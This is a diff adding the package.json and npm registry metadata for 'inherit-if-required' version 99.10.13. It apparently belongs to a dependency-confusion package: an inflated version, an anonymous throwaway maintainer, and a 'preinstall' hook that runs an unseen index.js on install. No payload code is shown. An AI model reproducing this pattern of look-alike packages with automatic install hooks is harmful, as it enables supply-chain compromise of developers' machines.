@@ -1,0 +1,39 @@
+{
+    "name": "inherit-if-required",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "inherit-if-required@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-tQf56oOSP0KtN76CGpasVCMubTfkRi7V5fxaRkGlcYGf8Jp1kaxub/3hg1yS+ilWiBdyLzvNpSQmF7btrynO4w==",
+        "shasum": "15b8a78fa2b1332b610ce5ac7398e83ba5720698",
+        "tarball": "https://registry.npmjs.org/inherit-if-required/-/inherit-if-required-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5077,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXdACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoqLg/7B10+CgxyGvD7e5AZFF/x+Jp1d9WDJo92C9PUAp1gn9U05QYu\r\n11OjyjSL840xxiyuv8M90H5FxFC8R8CsDo740DmFMPLRgQiRFRv2vWH5V63Z\r\n660GL+Kcg2HFKliB3pf+aZedslgD0f+7380BqtrxuiqOFV4bA7TS08JBmZIA\r\n2F+7Vz7NDJ4Ocej6qLLQMtS0MJr3e+YIQosrh5/ThQ7e1tWRA0tP1jysXMFR\r\nc6lfd9JYOqzEA/lUE2eF6uJAc04apvKiJ49In35kplx9DdqeuE0kVhs/T+mZ\r\nU+zHouCMBMav5xLNeOG/xNV/fB/IkTaXtK9H5nIHbiT7SysrLu2KfRMrm93R\r\nq+EwQG5eSgxYObswoddvIrb/IY+RZsGCQJSkqE3VlT7F5vrJ92FcXWQnoUZ1\r\nZehO3zhK/Mhw4AXiCghIfy20dcNpXV7V9ybHH4Xm+NIS3OP7xFiDbrBkKIsl\r\nZp3b7zxcAmmz3FtnpBr57Qu3ZID1UuJpd/5R8s5VExlmLxHpR8w2sF1d8b1O\r\nwjCPNaRFlTJZRjgQxBjuHZAOqTPI9Wx98HxpP5Ss3n/5IdFRjbK5KkX3CqH+\r\n6YDhPLTknjkdKQphOTVGolhpYiJzOQiNh4++JHaJarEofnJhRB+WAiMl0vFC\r\ndX57P1dt8Nlj5VmeOfKCXMHk/aDxPVgFXpc=\r\n=OXjb\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "iu6ztd12",
+        "email": "iu6ztd12@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "iu6ztd12",
+            "email": "iu6ztd12@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/inherit-if-required_99.10.13_1648420317810_0.7534175905558222"
+    },
+    "_hasShrinkwrap": false
+}
